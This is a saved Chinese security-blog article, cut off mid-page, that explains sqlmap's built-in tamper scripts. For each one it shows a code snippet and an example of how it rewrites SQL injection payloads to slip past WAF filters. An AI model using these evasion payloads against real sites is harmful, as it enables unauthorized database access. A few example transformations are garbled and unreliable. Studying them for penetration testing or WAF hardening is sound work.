<!DOCTYPE html>
<!-- saved from url=(0115)https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247485229&idx=1&sn=2eafa1e79d96658aafb89d8e868e7270&scene=21 -->
<html id="html" data-evernote-id="0" class="js-evernote-checked"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link id="baseCSS" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/reformat/css/base__newsprint.css" rel="stylesheet" class="newsprint" type="text/css"><style type="text/css" id="optionsCSS">#body { font-family: "PT Serif"; font-size: 16px; line-height: 1.5em; color: #1f0909; text-align: left; } #text { padding-top: 4.5em;padding-bottom: 9em;} #background { background-color: #f3f2ee; } .setTextColorAsBackgroundColor { background-color: #1f0909; } .setBackgroundColorAsTextColor { color: #f3f2ee; } .setBackgroundColor { background-color: #f3f2ee; } .setTextColor { color: #1f0909; } #box, .setBoxWidth { width: 36em; } a { color: #065588; } a:visited { color: #1f0909; } @media print { body.footnote_links__on_print a, body.footnote_links__on_print a:hover { color: #1f0909 !important; text-decoration: none !important; } } body.footnote_links__always a, body.footnote_links__always a:hover { color: #1f0909 !important; text-decoration: none !important; } img { border-color: #1f0909; } a img { border-color: #065588; } a:visited img { border-color: #1f0909; } h1 a, h2 a, a h1, a h2 { color: #1f0909; } h1, h2, h3, h4, h5, h6 { font-family: "PT Serif"; } pre { background-color: #f3f2ee; } pre, code { font-family: Inconsolata; } hr { border-color: #1f0909; } html.rtl #body #text { text-align: right !important; } h1, h2, h3, h4, h5, h6 { text-align: left; } html.rtl h1, html.rtl h2, html.rtl h3, html.rtl h4, html.rtl h5, html.rtl h6 { text-align: right !important; } #text div.separatorLine, #text section::before { background:      -o-linear-gradient(0, #f3f2ee 1%, #1f0909 50%, #f3f2ee 99%); background:    -moz-linear-gradient(0, #f3f2ee 1%, #1f0909 50%, #f3f2ee 99%); background: -webkit-linear-gradient(0, #f3f2ee 1%, #1f0909 50%, #f3f2ee 99%); } </style><link href="./css" rel="stylesheet" type="text/css"><link href="./css(1)" rel="stylesheet" type="text/css"><link id="clearly_highlighting_css" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/highlight/css/style.css" rel="stylesheet" type="text/css"><link id="clearly_highlighting_css_images" href="chrome-extension://pioclpoplcdbaefihamjohnefbikjilc/clearly/highlight/css/images.css" rel="stylesheet" type="text/css"></head><body id="body" class="footnote_links__on_print large_graphics__do_nothing js-evernote-checked" data-evernote-id="1"><div id="bodyContent" data-evernote-id="2" class="js-evernote-checked"><div id="box" data-evernote-id="3" class="js-evernote-checked"><div id="box_inner" data-evernote-id="4" class="js-evernote-checked"><div id="text" data-evernote-id="5" class="js-evernote-checked"><div id="pages" data-evernote-id="6" class="js-evernote-checked"><div class="page js-evernote-checked" id="page1" data-evernote-id="7"><div class="page_content js-evernote-checked" data-evernote-id="8"><div id="articleHeader" data-evernote-id="9" class="js-evernote-checked"><h1 id="articleHeader__title" data-evernote-id="10" class="js-evernote-checked"> sqlmap自带的tamper你了解多少？ </h1><div id="articleHeader__separator" class="separator js-evernote-checked" data-evernote-id="11"><div class="separatorLine setTextColorAsBackgroundColor js-evernote-checked" data-evernote-id="12"></div></div></div>
                <div id="meta_content" data-evernote-id="13" class="js-evernote-checked">
                                        
                                                            <em id="post-date" data-evernote-id="14" class="js-evernote-checked">2017-10-29</em>

                                        <em data-evernote-id="15" class="js-evernote-checked">67</em>
                                        <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485229&amp;idx=1&amp;sn=2eafa1e79d96658aafb89d8e868e7270&amp;scene=21##" id="post-user" target="_blank" data-evernote-id="16" class="js-evernote-checked">信安之路</a>
                    <span data-evernote-id="17" class="js-evernote-checked">信安之路</span>

                    
                </div>
                
                
                
                
                                                
                                                                
                
                
                    

                    

                    
                    
                    <blockquote data-evernote-id="18" class="js-evernote-checked"><p data-evernote-id="19" class="js-evernote-checked">为了鼓励大家更多的投稿，本文奖励作者 10 元，欢迎大家积极分享自己的所学所感，为我们的信安之路添砖加瓦。</p></blockquote><p data-evernote-id="20" class="js-evernote-checked">sqlmap 是一款注入神器广为人知，里面的 tamper 常常用来绕过 WAF ，很实用的模块，但是却常常被新手忽略（比如我），今天就整理总结一下 tamper 的用法以及 tamper 的编写</p><p data-evernote-id="21" class="js-evernote-checked"><strong data-evernote-id="22" class="js-evernote-checked">PS：</strong>工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p><p data-evernote-id="23" class="js-evernote-checked">ALL 表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据。</p><h3 data-evernote-id="24" class="js-evernote-checked">使用方法：</h3><blockquote data-evernote-id="25" class="js-evernote-checked"><p data-evernote-id="26" class="js-evernote-checked">sqlmap.py XXXXX -tamper "模块名"</p></blockquote><h3 data-evernote-id="27" class="js-evernote-checked">各个 tamper 的作用</h3><p data-evernote-id="28" class="js-evernote-checked">下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><h4 data-evernote-id="29" class="js-evernote-checked">apostrophemask.py:</h4><blockquote data-evernote-id="30" class="js-evernote-checked"><p data-evernote-id="31" class="js-evernote-checked">return payload.replace('\'', "%EF%BC%87") if payload else payload</p></blockquote><p data-evernote-id="32" class="js-evernote-checked">将单引号 url 编码，用于过滤了单引号的情况。</p><blockquote data-evernote-id="33" class="js-evernote-checked"><p data-evernote-id="34" class="js-evernote-checked">1' AND '1'='1 &nbsp;<strong data-evernote-id="35" class="js-evernote-checked">to</strong> 	1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p data-evernote-id="36" class="js-evernote-checked"><strong data-evernote-id="37" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="38" class="js-evernote-checked">apostrophenullencode.py:</h4><blockquote data-evernote-id="39" class="js-evernote-checked"><p data-evernote-id="40" class="js-evernote-checked">return payload.replace('\'', "%00%27") if payload else payload</p></blockquote><p data-evernote-id="41" class="js-evernote-checked">将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote data-evernote-id="42" class="js-evernote-checked"><p data-evernote-id="43" class="js-evernote-checked">1' AND '1'='1 	<strong data-evernote-id="44" class="js-evernote-checked">to</strong> 	1�' AND �'1�'=�'1</p></blockquote><p data-evernote-id="45" class="js-evernote-checked"><strong data-evernote-id="46" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="47" class="js-evernote-checked">appendnullbyte.py:</h4><blockquote data-evernote-id="48" class="js-evernote-checked"><p data-evernote-id="49" class="js-evernote-checked">return "%s%%00" % payload if payload else payload</p></blockquote><p data-evernote-id="50" class="js-evernote-checked">在你构造的payload后面加一个空字符</p><blockquote data-evernote-id="51" class="js-evernote-checked"><p data-evernote-id="52" class="js-evernote-checked">1' AND '1'='1	<strong data-evernote-id="53" class="js-evernote-checked">to</strong>	1' AND '1'='1[]</p></blockquote><p data-evernote-id="54" class="js-evernote-checked"><strong data-evernote-id="55" class="js-evernote-checked">适用数据库：</strong>Access</p><h4 data-evernote-id="56" class="js-evernote-checked">base64encode.py:</h4><blockquote data-evernote-id="57" class="js-evernote-checked"><p data-evernote-id="58" class="js-evernote-checked">return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p data-evernote-id="59" class="js-evernote-checked">这个看模块名也知道是 base64 编码</p><blockquote data-evernote-id="60" class="js-evernote-checked"><p data-evernote-id="61" class="js-evernote-checked">1' AND '1'='1 	<strong data-evernote-id="62" class="js-evernote-checked">to</strong>	MScgQU5EICcxJz0nMQ==</p></blockquote><p data-evernote-id="63" class="js-evernote-checked"><strong data-evernote-id="64" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="65" class="js-evernote-checked">between.py:</h4><p data-evernote-id="66" class="js-evernote-checked">这个代码有点长，就不贴代码了，可以自己去查看：<code data-evernote-id="67" class="js-evernote-checked">C:\Python\SQLMap\tamper\between.py</code></p><p data-evernote-id="68" class="js-evernote-checked">将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote data-evernote-id="69" class="js-evernote-checked"><p data-evernote-id="70" class="js-evernote-checked">1 AND A &gt; B	<strong data-evernote-id="71" class="js-evernote-checked">to</strong>	1 AND A NOT BETWEEN 0 AND B</p></blockquote><blockquote data-evernote-id="72" class="js-evernote-checked"><p data-evernote-id="73" class="js-evernote-checked">1 AND A = B	<strong data-evernote-id="74" class="js-evernote-checked">to</strong>	1 AND A BETWEEN B AND B</p></blockquote><p data-evernote-id="75" class="js-evernote-checked"><strong data-evernote-id="76" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="77" class="js-evernote-checked">bluecoat.py:</h4><p data-evernote-id="78" class="js-evernote-checked">用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote data-evernote-id="79" class="js-evernote-checked"><p data-evernote-id="80" class="js-evernote-checked">union select * from users where id = 1	<strong data-evernote-id="81" class="js-evernote-checked">to</strong>	union%09select * from%09users where id like 1</p></blockquote><p data-evernote-id="82" class="js-evernote-checked"><strong data-evernote-id="83" class="js-evernote-checked">适用数据库：</strong>MySQL 5.1, SGOS</p><h4 data-evernote-id="84" class="js-evernote-checked">chardoubleencode.py:</h4><p data-evernote-id="85" class="js-evernote-checked">用 url 编码两次你的 payload </p><blockquote data-evernote-id="86" class="js-evernote-checked"><p data-evernote-id="87" class="js-evernote-checked">select * from users	<strong data-evernote-id="88" class="js-evernote-checked">to</strong>	%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p data-evernote-id="89" class="js-evernote-checked"><strong data-evernote-id="90" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="91" class="js-evernote-checked">charencode.py:</h4><p data-evernote-id="92" class="js-evernote-checked">用 url 编码一次你的 payload</p><blockquote data-evernote-id="93" class="js-evernote-checked"><p data-evernote-id="94" class="js-evernote-checked">select * from users	<strong data-evernote-id="95" class="js-evernote-checked">to</strong>	%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p data-evernote-id="96" class="js-evernote-checked"><strong data-evernote-id="97" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="98" class="js-evernote-checked">charunicodeencode.py：</h4><p data-evernote-id="99" class="js-evernote-checked">用 unicode 编码 payload ，只编码非编码字符</p><blockquote data-evernote-id="100" class="js-evernote-checked"><p data-evernote-id="101" class="js-evernote-checked">select * from users	<strong data-evernote-id="102" class="js-evernote-checked">to</strong>	\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</p></blockquote><p data-evernote-id="103" class="js-evernote-checked"><strong data-evernote-id="104" class="js-evernote-checked">适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h4 data-evernote-id="105" class="js-evernote-checked">commalesslimit.py：</h4><p data-evernote-id="106" class="js-evernote-checked">将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote data-evernote-id="107" class="js-evernote-checked"><p data-evernote-id="108" class="js-evernote-checked">limit 2,1	<strong data-evernote-id="109" class="js-evernote-checked">to</strong>	limit 1 offset 2</p></blockquote><p data-evernote-id="110" class="js-evernote-checked"><strong data-evernote-id="111" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="112" class="js-evernote-checked">commalessmid.py：</h4><p data-evernote-id="113" class="js-evernote-checked">将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote data-evernote-id="114" class="js-evernote-checked"><p data-evernote-id="115" class="js-evernote-checked">mid(version(), 1, 1)	<strong data-evernote-id="116" class="js-evernote-checked">to</strong>	mid(version() from 1 for 1)</p></blockquote><p data-evernote-id="117" class="js-evernote-checked"><strong data-evernote-id="118" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="119" class="js-evernote-checked">commentbeforeparentheses.py：</h4><blockquote data-evernote-id="120" class="js-evernote-checked"><p data-evernote-id="121" class="js-evernote-checked">retVal = re.sub(r"\b(\w+)(", "\g&lt;1&gt;/**/(", retVal)</p></blockquote><p data-evernote-id="122" class="js-evernote-checked">在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote data-evernote-id="123" class="js-evernote-checked"><p data-evernote-id="124" class="js-evernote-checked">union select group_concat(table_name)	<strong data-evernote-id="125" class="js-evernote-checked">to</strong>	union select group_concat/**/(table_name)</p></blockquote><p data-evernote-id="126" class="js-evernote-checked"><strong data-evernote-id="127" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="128" class="js-evernote-checked">concat2concatws.py：</h4><blockquote data-evernote-id="129" class="js-evernote-checked"><p data-evernote-id="130" class="js-evernote-checked">payload = payload.replace("CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")</p></blockquote><p data-evernote-id="131" class="js-evernote-checked">用于过滤了 concat 函数的情况</p><blockquote data-evernote-id="132" class="js-evernote-checked"><p data-evernote-id="133" class="js-evernote-checked">concat(1,2)	<strong data-evernote-id="134" class="js-evernote-checked">to</strong>	concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p data-evernote-id="135" class="js-evernote-checked"><strong data-evernote-id="136" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="137" class="js-evernote-checked">equaltolike.py：</h4><blockquote data-evernote-id="138" class="js-evernote-checked"><p data-evernote-id="139" class="js-evernote-checked">retVal = re.sub(r"\s<em data-evernote-id="140" class="js-evernote-checked">=\s</em>", " LIKE ", retVal)</p></blockquote><p data-evernote-id="141" class="js-evernote-checked">将等号用 like 代替，用于过滤了等号的情况</p><blockquote data-evernote-id="142" class="js-evernote-checked"><p data-evernote-id="143" class="js-evernote-checked">select * from users where id=1	<strong data-evernote-id="144" class="js-evernote-checked">to</strong>	select * from users where id like 1</p></blockquote><p data-evernote-id="145" class="js-evernote-checked"><strong data-evernote-id="146" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="147" class="js-evernote-checked">escapequotes.py：</h4><blockquote data-evernote-id="148" class="js-evernote-checked"><p data-evernote-id="149" class="js-evernote-checked">return payload.replace("'", "\'").replace('"', '\"')</p></blockquote><p data-evernote-id="150" class="js-evernote-checked">将单引号转换成 \\' ，双引号转换成 \\" ，用于过滤了单引号或双引号的情况</p><blockquote data-evernote-id="151" class="js-evernote-checked"><p data-evernote-id="152" class="js-evernote-checked">1' and 1=1--+	<strong data-evernote-id="153" class="js-evernote-checked">to</strong>	1\\' and 1=1--+</p></blockquote><p data-evernote-id="154" class="js-evernote-checked"><strong data-evernote-id="155" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="156" class="js-evernote-checked">greatest.py：</h4><p data-evernote-id="157" class="js-evernote-checked">用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote data-evernote-id="158" class="js-evernote-checked"><p data-evernote-id="159" class="js-evernote-checked">1 and a&gt;b	<strong data-evernote-id="160" class="js-evernote-checked">to</strong>	1 and greatest(a,b+1)=a</p></blockquote><p data-evernote-id="161" class="js-evernote-checked">ALL</p><h4 data-evernote-id="162" class="js-evernote-checked">halfversionedmorekeywords.py：</h4><p data-evernote-id="163" class="js-evernote-checked">在关键字前添加注释，用于过滤了关键字的情况</p><blockquote data-evernote-id="164" class="js-evernote-checked"><p data-evernote-id="165" class="js-evernote-checked">union select 1,2	<strong data-evernote-id="166" class="js-evernote-checked">to</strong>	/*!0union/*!0select 1,2</p></blockquote><p data-evernote-id="167" class="js-evernote-checked"><strong data-evernote-id="168" class="js-evernote-checked">适用数据库：</strong>MySQL &lt; 5.1</p><h4 data-evernote-id="169" class="js-evernote-checked">htmlencode.py：</h4><blockquote data-evernote-id="170" class="js-evernote-checked"><p data-evernote-id="171" class="js-evernote-checked">return re.sub(r"[^\w]", lambda match: "&amp;#%d;" % ord(match.group(0)), payload) if payload else payload</p></blockquote><p data-evernote-id="172" class="js-evernote-checked">从名字就知道是将 payload 进行 html 编码</p><blockquote data-evernote-id="173" class="js-evernote-checked"><p data-evernote-id="174" class="js-evernote-checked">1' and 1=1--+	<strong data-evernote-id="175" class="js-evernote-checked">to</strong>	1' and 1=1--+</p></blockquote><p data-evernote-id="176" class="js-evernote-checked"><strong data-evernote-id="177" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="178" class="js-evernote-checked">ifnull2ifisnull.py：</h4><p data-evernote-id="179" class="js-evernote-checked">将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote data-evernote-id="180" class="js-evernote-checked"><p data-evernote-id="181" class="js-evernote-checked">ifnull(1, 2)	<strong data-evernote-id="182" class="js-evernote-checked">to</strong>	if(isnull(1), 2, 1)</p></blockquote><p data-evernote-id="183" class="js-evernote-checked"><strong data-evernote-id="184" class="js-evernote-checked">适用数据库：</strong>MySql</p><h4 data-evernote-id="185" class="js-evernote-checked">informationschemacomment.py：</h4><blockquote data-evernote-id="186" class="js-evernote-checked"><p data-evernote-id="187" class="js-evernote-checked">retVal = re.sub(r"(?i)(information_schema).", "\g&lt;1&gt;/**/.", payload)</p></blockquote><p data-evernote-id="188" class="js-evernote-checked">在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote data-evernote-id="189" class="js-evernote-checked"><p data-evernote-id="190" class="js-evernote-checked">select table_name from information_schema.tables	<strong data-evernote-id="191" class="js-evernote-checked">to</strong>	select table_name from information_schema/**/.tables</p></blockquote><p data-evernote-id="192" class="js-evernote-checked"><strong data-evernote-id="193" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="194" class="js-evernote-checked">lowercase.py：</h4><p data-evernote-id="195" class="js-evernote-checked">将 payload 里的大写转为小写</p><blockquote data-evernote-id="196" class="js-evernote-checked"><p data-evernote-id="197" class="js-evernote-checked">UNION SELECT	<strong data-evernote-id="198" class="js-evernote-checked">to</strong>	union select</p></blockquote><p data-evernote-id="199" class="js-evernote-checked"><strong data-evernote-id="200" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="201" class="js-evernote-checked">modsecurityversioned.py：</h4><p data-evernote-id="202" class="js-evernote-checked">用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote data-evernote-id="203" class="js-evernote-checked"><p data-evernote-id="204" class="js-evernote-checked">1 and 2&gt;1--+	<strong data-evernote-id="205" class="js-evernote-checked">to</strong>	1 /*!30874and 2&gt;1*/--+</p></blockquote><p data-evernote-id="206" class="js-evernote-checked"><strong data-evernote-id="207" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="208" class="js-evernote-checked">modsecurityzeroversioned.py：</h4><p data-evernote-id="209" class="js-evernote-checked">用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote data-evernote-id="210" class="js-evernote-checked"><p data-evernote-id="211" class="js-evernote-checked">1 and 2&gt;1--+	<strong data-evernote-id="212" class="js-evernote-checked">to</strong>	1 /*!00000and 2&gt;1*/--+</p></blockquote><p data-evernote-id="213" class="js-evernote-checked"><strong data-evernote-id="214" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="215" class="js-evernote-checked">multiplespaces.py：</h4><p data-evernote-id="216" class="js-evernote-checked">在关键字周围添加多个空格</p><blockquote data-evernote-id="217" class="js-evernote-checked"><p data-evernote-id="218" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="219" class="js-evernote-checked">to</strong>	union &nbsp; &nbsp; &nbsp; &nbsp; select &nbsp; &nbsp; &nbsp; 1,2--+</p></blockquote><p data-evernote-id="220" class="js-evernote-checked"><strong data-evernote-id="221" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="222" class="js-evernote-checked">nonrecursivereplacement.py：</h4><p data-evernote-id="223" class="js-evernote-checked">关键字双写，可用于关键字过滤</p><blockquote data-evernote-id="224" class="js-evernote-checked"><p data-evernote-id="225" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="226" class="js-evernote-checked">to</strong>	uniounionn selecselectt 1,2--+</p></blockquote><p data-evernote-id="227" class="js-evernote-checked"><strong data-evernote-id="228" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="229" class="js-evernote-checked">overlongutf8.py：</h4><p data-evernote-id="230" class="js-evernote-checked">这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote data-evernote-id="231" class="js-evernote-checked"><p data-evernote-id="232" class="js-evernote-checked">select field from table where 2&gt;1	<strong data-evernote-id="233" class="js-evernote-checked">to</strong>	select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p data-evernote-id="234" class="js-evernote-checked"><strong data-evernote-id="235" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="236" class="js-evernote-checked">percentage.py：</h4><p data-evernote-id="237" class="js-evernote-checked">用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote data-evernote-id="238" class="js-evernote-checked"><p data-evernote-id="239" class="js-evernote-checked">select * from users	<strong data-evernote-id="240" class="js-evernote-checked">to</strong>	%s%e%l%e%c%t * %f%r%o%m %u%s%e%r%s</p></blockquote><p data-evernote-id="241" class="js-evernote-checked"><strong data-evernote-id="242" class="js-evernote-checked">适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h4 data-evernote-id="243" class="js-evernote-checked">plus2concat.py：</h4><p data-evernote-id="244" class="js-evernote-checked">用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote data-evernote-id="245" class="js-evernote-checked"><p data-evernote-id="246" class="js-evernote-checked">select char(13)+char(114)+char(115) from user	<strong data-evernote-id="247" class="js-evernote-checked">to</strong>	select concat(char(113),char(114),char(115)) from user</p></blockquote><p data-evernote-id="248" class="js-evernote-checked"><strong data-evernote-id="249" class="js-evernote-checked">适用数据库：</strong>SQL Server 2012+</p><h4 data-evernote-id="250" class="js-evernote-checked">plus2fnconcat.py：</h4><p data-evernote-id="251" class="js-evernote-checked">用 fn concat 来替代加号，和上面类似</p><blockquote data-evernote-id="252" class="js-evernote-checked"><p data-evernote-id="253" class="js-evernote-checked">select char(13)+char(114)+char(115) from user	<strong data-evernote-id="254" class="js-evernote-checked">to</strong>	select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p data-evernote-id="255" class="js-evernote-checked"><strong data-evernote-id="256" class="js-evernote-checked">适用数据库：</strong>Microsoft SQL Server 2008+</p><h4 data-evernote-id="257" class="js-evernote-checked">randomcase.py：</h4><p data-evernote-id="258" class="js-evernote-checked">将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote data-evernote-id="259" class="js-evernote-checked"><p data-evernote-id="260" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="261" class="js-evernote-checked">to</strong>	UniOn SElect 1,2--+</p></blockquote><p data-evernote-id="262" class="js-evernote-checked"><strong data-evernote-id="263" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="264" class="js-evernote-checked">randomcomments.py：</h4><p data-evernote-id="265" class="js-evernote-checked">在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote data-evernote-id="266" class="js-evernote-checked"><p data-evernote-id="267" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="268" class="js-evernote-checked">to</strong>	un/**/ion sele/**/ct 1,2--+</p></blockquote><p data-evernote-id="269" class="js-evernote-checked"><strong data-evernote-id="270" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="271" class="js-evernote-checked">securesphere.py：</h4><blockquote data-evernote-id="272" class="js-evernote-checked"><p data-evernote-id="273" class="js-evernote-checked">return payload + " and '0having'='0having'" if payload else payload</p></blockquote><p data-evernote-id="274" class="js-evernote-checked">在 payload 后面加入字符串，可以自定义</p><blockquote data-evernote-id="275" class="js-evernote-checked"><p data-evernote-id="276" class="js-evernote-checked">1' and 1=1	<strong data-evernote-id="277" class="js-evernote-checked">to</strong>	1' and 1=1 '0having'='0having'</p></blockquote><p data-evernote-id="278" class="js-evernote-checked"><strong data-evernote-id="279" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="280" class="js-evernote-checked">sp_password.py：</h4><blockquote data-evernote-id="281" class="js-evernote-checked"><p data-evernote-id="282" class="js-evernote-checked">retVal = "%s%ssp_password" % (payload, "-- " if not any(_ if _ in payload else None for _ in ('#', "-- ")) else "")</p></blockquote><p data-evernote-id="283" class="js-evernote-checked">在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote data-evernote-id="284" class="js-evernote-checked"><p data-evernote-id="285" class="js-evernote-checked">1’ &nbsp;and 1=1--+	<strong data-evernote-id="286" class="js-evernote-checked">to</strong>	1 and 1=1-- sp_password</p></blockquote><p data-evernote-id="287" class="js-evernote-checked"><strong data-evernote-id="288" class="js-evernote-checked">适用数据库：</strong>MSSQL</p><h4 data-evernote-id="289" class="js-evernote-checked">space2comment.py：</h4><p data-evernote-id="290" class="js-evernote-checked">用 /**/ 替代空格，用于空格的绕过</p><blockquote data-evernote-id="291" class="js-evernote-checked"><p data-evernote-id="292" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="293" class="js-evernote-checked">to</strong>	union/**/select/**/1,2--+</p></blockquote><p data-evernote-id="294" class="js-evernote-checked"><strong data-evernote-id="295" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="296" class="js-evernote-checked">space2dash.py：</h4><p data-evernote-id="297" class="js-evernote-checked">用注释符--和一个随机字符串加一个换行符替换控制符</p><p data-evernote-id="298" class="js-evernote-checked">?union select 1,2--+	<strong data-evernote-id="299" class="js-evernote-checked">to</strong>	union--HSHjsJh%0Aselect--HhjHSJ%0A1,2--+</p><p data-evernote-id="300" class="js-evernote-checked"><strong data-evernote-id="301" class="js-evernote-checked">适用数据库：</strong>MSSQL、 SQLite</p><h4 data-evernote-id="302" class="js-evernote-checked">space2hash.py：</h4><p data-evernote-id="303" class="js-evernote-checked">和上面类似，不过这儿是用#注释符</p><blockquote data-evernote-id="304" class="js-evernote-checked"><p data-evernote-id="305" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="306" class="js-evernote-checked">to</strong>	union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+</p></blockquote><p data-evernote-id="307" class="js-evernote-checked"><strong data-evernote-id="308" class="js-evernote-checked">适用数据库：</strong>MySQL</p><h4 data-evernote-id="309" class="js-evernote-checked">space2morecomment.py：</h4><p data-evernote-id="310" class="js-evernote-checked">将空格用 /**_**/ 替代</p><blockquote data-evernote-id="311" class="js-evernote-checked"><p data-evernote-id="312" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="313" class="js-evernote-checked">to</strong>	union/**_**/select/**_**/1,2--+</p></blockquote><p data-evernote-id="314" class="js-evernote-checked"><strong data-evernote-id="315" class="js-evernote-checked">适用数据库：</strong>ALL</p><h4 data-evernote-id="316" class="js-evernote-checked">space2morehash.py：</h4><p data-evernote-id="317" class="js-evernote-checked">和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote data-evernote-id="318" class="js-evernote-checked"><p data-evernote-id="319" class="js-evernote-checked">space2hash.py：		union select 1,2--+	<strong data-evernote-id="320" class="js-evernote-checked">to</strong>	union &nbsp;%23 &nbsp;HSHjsJh &nbsp;%0A &nbsp;select &nbsp;%23 &nbsp;HhjHSJ &nbsp;%0A1,2--+</p></blockquote><blockquote data-evernote-id="321" class="js-evernote-checked"><p data-evernote-id="322" class="js-evernote-checked">space2morehash.py：union select 1,2--+	<strong data-evernote-id="323" class="js-evernote-checked">to</strong>	union &nbsp;%23 &nbsp;HSHjsJh &nbsp;%0A &nbsp;select &nbsp;%23 &nbsp;HhjHSJ &nbsp;%0A%23 &nbsp;HJHJhj &nbsp;%0A &nbsp;1,2--+</p></blockquote><p data-evernote-id="324" class="js-evernote-checked"><strong data-evernote-id="325" class="js-evernote-checked">适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 data-evernote-id="326" class="js-evernote-checked">space2mssqlblank.py：</h4><blockquote data-evernote-id="327" class="js-evernote-checked"><p data-evernote-id="328" class="js-evernote-checked">blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')</p></blockquote><p data-evernote-id="329" class="js-evernote-checked">用这些随机空白符替换 payload 中的空格</p><blockquote data-evernote-id="330" class="js-evernote-checked"><p data-evernote-id="331" class="js-evernote-checked">union select 1,2--+	<strong data-evernote-id="332" class="js-evernote-checked">to</strong>	union%01select%021,2--+</p></blockquote><p data-evernote-id="333" class="js-evernote-checked"><strong data-evernote-id="334" class="js-evernote-checked">适用数据库：</strong>SQL Server</p><h4 data-evernote-id="335" class="js-evernote-checked">space2mssqlhash.py：</h4><p data-evernote-id="336" class="js-evernote-checked">用 # 加一个换行符替换 payload 中的空格</p><blockquote data-evernote-id="337" class="js-evernote-checked"><p data-evernote-id="338" class="js-evernote-checked">union select 1,2--+ <strong data-evernote-id="339" class="js-evernote-checked">to</strong>	union%23%0Aselect%23%0A1,2--+</p></blockquote><p data-evernote-id="340" class="js-evernote-checked"><strong data-evernote-id="341" 